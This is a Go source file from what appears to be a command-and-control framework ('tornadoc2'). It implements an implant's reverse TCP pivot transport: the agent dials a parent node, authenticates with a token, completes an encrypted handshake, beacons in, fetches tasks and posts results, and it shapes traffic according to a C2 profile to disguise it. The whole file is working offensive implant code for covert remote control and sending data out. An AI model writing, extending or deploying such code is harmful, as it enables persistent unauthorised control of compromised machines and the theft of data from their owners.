package transport

import (
	"bufio"
	"crypto/ecdsa"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/internal/pivot"
	"tornadoc2/agent/protocol"
)

const (
	tcpRevDialTimeout      = 15 * time.Second
	tcpRevAuthTimeout      = 10 * time.Second
	tcpRevRoundTripTimeout = 60 * time.Second
	tcpRevMaxFrame         = 16 * 1024 * 1024
)

type tcpRevTransport struct {
	target     string
	tokenHex   string
	tokenBytes []byte

	agentPriv *ecdsa.PrivateKey
	pivotPub  *ecdsa.PublicKey
	fp        string

	// shaping is the C2 profile's shaping spec, embedded at build
	// time from the same --c2-profile the parent was built against.
	// The child decrypts the wire envelope with its own wire
	// session, then unwraps the shape with this spec. The parent
	// cannot do either step on the child's behalf: the wire session
	// key belongs to the child, not to the parent.
	shaping *features.ShapingSpec

	mu        sync.Mutex
	conn      net.Conn
	rd        *bufio.Reader
	closed    bool
	pivotSess *pivot.Session
}

func NewTCPRevTransport(target, token string,
	agentPriv *ecdsa.PrivateKey,
	pivotPub *ecdsa.PublicKey,
	identity protocol.Identity,
	shaping *features.ShapingSpec) (*tcpRevTransport, error) {

	if target == "" {
		return nil, errors.New(
			"tcp reverse: target address is empty")
	}
	raw, err := hex.DecodeString(token)
	if err != nil || len(raw) == 0 {
		return nil, fmt.Errorf(
			"tcp reverse: token is not valid hex (%q): %v",
			token, err)
	}
	fp := identity.Fingerprint()
	if fp == "" {
		return nil, errors.New(
			"tcp reverse: identity produced an empty fingerprint")
	}
	return &tcpRevTransport{
		target:     target,
		tokenHex:   token,
		tokenBytes: raw,
		agentPriv:  agentPriv,
		pivotPub:   pivotPub,
		fp:         fp,
		shaping:    shaping,
	}, nil
}

func (t *tcpRevTransport) Name() string { return "tcprev" }

func (t *tcpRevTransport) closeConn() {
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
		t.rd = nil
	}
	if t.pivotSess != nil {
		t.pivotSess.Close()
		t.pivotSess = nil
	}
}

type revChildIO struct {
	conn net.Conn
	rd   *bufio.Reader
}

func (f *revChildIO) WriteFrame(body []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(body)))
	if _, err := f.conn.Write(lenBuf[:]); err != nil {
		return err
	}
	_, err := f.conn.Write(body)
	return err
}

func (f *revChildIO) ReadFrame() ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(f.rd, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > tcpRevMaxFrame {
		return nil, fmt.Errorf(
			"tcp reverse: invalid frame length %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(f.rd, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

// dialAndHandshake opens a fresh TCP connection to the parent's
// reverse listener, sends the auth token frame, and completes the
// pivot handshake. On success the connection and pivot session are
// stored on the transport; the caller must hold t.mu.
func (t *tcpRevTransport) dialAndHandshake() error {
	conn, err := net.DialTimeout("tcp", t.target,
		tcpRevDialTimeout)
	if err != nil {
		return fmt.Errorf("tcp reverse: dial %s: %w",
			t.target, err)
	}

	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:],
		uint32(len(t.tokenBytes)))
	conn.SetWriteDeadline(time.Now().Add(tcpRevAuthTimeout))
	if _, err := conn.Write(lenBuf[:]); err != nil {
		conn.Close()
		return fmt.Errorf("tcp reverse: auth length: %w", err)
	}
	if _, err := conn.Write(t.tokenBytes); err != nil {
		conn.Close()
		return fmt.Errorf("tcp reverse: auth body: %w", err)
	}
	conn.SetWriteDeadline(time.Time{})

	rd := bufio.NewReaderSize(conn, 64*1024)
	fio := &revChildIO{conn: conn, rd: rd}

	conn.SetReadDeadline(time.Now().Add(tcpRevRoundTripTimeout))
	sess, err := pivot.ClientHandshake(
		fio, t.agentPriv, t.pivotPub, t.fp)
	if err != nil {
		conn.Close()
		return fmt.Errorf("tcp reverse: pivot handshake: %w", err)
	}
	conn.SetReadDeadline(time.Time{})

	t.conn = conn
	t.rd = rd
	t.pivotSess = sess
	diag("[beacon] tcp reverse: connected to %s\n", t.target)
	return nil
}

func (t *tcpRevTransport) roundTrip(req []byte) ([]byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.closed {
		return nil, errors.New("tcp reverse: transport closed")
	}

	for attempt := 0; attempt < 2; attempt++ {
		if t.conn == nil || t.pivotSess == nil {
			if err := t.dialAndHandshake(); err != nil {
				t.closeConn()
				return nil, err
			}
		}

		conn := t.conn
		rd := t.rd
		sess := t.pivotSess
		fio := &revChildIO{conn: conn, rd: rd}

		frame, err := sess.EncryptChildToParent(req)
		if err != nil {
			t.closeConn()
			continue
		}
		frameBytes, err := pivot.EncodeFrame(frame)
		if err != nil {
			t.closeConn()
			return nil, err
		}

		conn.SetWriteDeadline(
			time.Now().Add(tcpRevRoundTripTimeout))
		if err := fio.WriteFrame(frameBytes); err != nil {
			t.closeConn()
			continue
		}

		conn.SetReadDeadline(
			time.Now().Add(tcpRevRoundTripTimeout))
		respBytes, err := fio.ReadFrame()
		if err != nil {
			t.closeConn()
			continue
		}
		respFrame, err := pivot.DecodeFrame(respBytes)
		if err != nil {
			t.closeConn()
			return nil, err
		}
		plaintext, err := sess.DecryptParentToChild(respFrame)
		if err != nil {
			t.closeConn()
			return nil, err
		}
		return plaintext, nil
	}
	return nil, errors.New(
		"tcp reverse: connection failed after reconnect")
}

func (t *tcpRevTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	env := map[string]interface{}{
		"op":   "beacon",
		"body": json.RawMessage(body),
	}
	reqBytes, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return nil, err
	}
	var reply struct {
		Body   json.RawMessage `json:"body"`
		Err    string          `json:"error"`
		Status int             `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &reply); err != nil {
		return nil, fmt.Errorf("tcp reverse: bad reply: %w", err)
	}
	if reply.Status != 0 {
		return nil, fmt.Errorf("tcp reverse: status %d: %s",
			reply.Status, reply.Err)
	}
	if reply.Err != "" {
		return nil, errors.New("tcp reverse: " + reply.Err)
	}
	respBody := []byte(reply.Body)

	// Order matters and matches the HTTP transport:
	//   1. decrypt the wire envelope (the server encrypts the
	//      whole shaped body, not the inner payload)
	//   2. unwrap the shaping template (extracts the plaintext
	//      from the shaped JSON)
	//   3. unmarshal as CheckinResponse
	//
	// The parent forwards both bodies verbatim. The wire session
	// key is the child's, so only the child can do step 1; and
	// once step 1 has run, the shaped body is visible for step 2.
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(respBody)
		if derr != nil {
			return nil, fmt.Errorf(
				"tcp reverse: decrypt: %w", derr)
		}
		if wasEnc {
			respBody = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		u, serr := features.ShapeUnwrap(
			respBody, t.shaping.CheckinResponse)
		if serr != nil {
			return nil, fmt.Errorf(
				"tcp reverse: checkin shape: %w", serr)
		}
		respBody = u
	}
	var out CheckinResponse
	if err := json.Unmarshal(respBody, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

func (t *tcpRevTransport) FetchTasks(wire *WireSession) ([]Task, error) {
	env := map[string]interface{}{"op": "tasks"}
	reqBytes, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return nil, err
	}
	var reply struct {
		Body   json.RawMessage `json:"body"`
		Err    string          `json:"error"`
		Status int             `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &reply); err != nil {
		return nil, fmt.Errorf("tcp reverse: bad reply: %w", err)
	}
	if reply.Status != 0 {
		return nil, fmt.Errorf("tcp reverse: status %d: %s",
			reply.Status, reply.Err)
	}
	if reply.Err != "" {
		return nil, errors.New("tcp reverse: " + reply.Err)
	}
	body := []byte(reply.Body)

	if wire != nil && crypto.IsEnvelope(body) {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf(
				"tcp reverse: decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		u, serr := features.ShapeUnwrap(
			body, t.shaping.TasksResponse)
		if serr != nil {
			return nil, fmt.Errorf(
				"tcp reverse: tasks shape: %w", serr)
		}
		body = u
	}
	var tasks []Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *tcpRevTransport) PostResult(r Result,
	wire *WireSession) error {

	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(
			t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	env := map[string]interface{}{
		"op":   "results",
		"body": json.RawMessage(body),
	}
	reqBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return err
	}
	var reply struct {
		Err    string `json:"error"`
		Status int    `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &reply); err != nil {
		return fmt.Errorf("tcp reverse: bad reply: %w", err)
	}
	if reply.Status != 0 {
		return fmt.Errorf("tcp reverse: status %d: %s",
			reply.Status, reply.Err)
	}
	if reply.Err != "" {
		return errors.New("tcp reverse: " + reply.Err)
	}
	return nil
}

func (t *tcpRevTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.closed = true
	t.closeConn()
	return nil
}